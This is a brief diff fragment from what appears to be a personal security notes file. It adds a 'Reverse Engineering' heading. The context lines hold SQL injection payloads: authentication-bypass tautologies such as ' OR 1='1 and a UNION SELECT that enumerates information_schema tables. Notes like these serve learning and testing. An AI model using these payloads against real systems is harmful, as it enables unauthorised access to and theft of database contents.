@@ -59,6 +59,9 @@ select id FROM users WHERE name='tom'or 1='1' AND pass='tom' or 1='1'
 text Box()
 ram' OR 1='1
 
+# Reverse Engineering
+
+
 url()
 category=1 or 1=1
 UNION SELECT 1,table_name,3 FROM information_schema.tables
